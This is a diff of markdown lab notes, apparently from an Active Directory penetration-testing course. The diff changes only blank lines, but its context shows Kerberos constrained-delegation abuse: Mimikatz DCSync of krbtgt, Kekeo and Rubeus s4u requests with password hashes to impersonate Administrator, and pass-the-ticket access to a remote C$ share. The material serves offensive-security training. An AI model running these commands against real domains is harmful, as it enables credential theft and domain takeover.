@@ -320,6 +320,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ![](https://i.imgur.com/ezTsNOd.png)
 
 
+
 **_Example_**
 
 
@@ -343,8 +344,10 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 
 ## **Abusing with Kekeo**
 
+
 - Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv
 - Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
+
 
 
 ```powershell
@@ -356,12 +359,14 @@ kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5
 - Using s4u from Kekeo, we request a TGS (steps 4 & 5):
 
 
+
 ```powershell
 tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
 ```
 
 
 - Using mimikatz, inject the ticket (Step 6):
+
 
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::ptt
@@ -385,19 +390,23 @@ ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 ## **Abusing with Rubeus**
 
 
+
 - We can use the following command (We are requesting a TGT and TGS in a single command):
+
 
 
 ```powershell
 Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
 ```
 
+
 - you can now run command on remote system ( **msDS-AllowedToDelegateTo**)
+
+
 
 ```powershell
 ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 ```
-
 
 
 
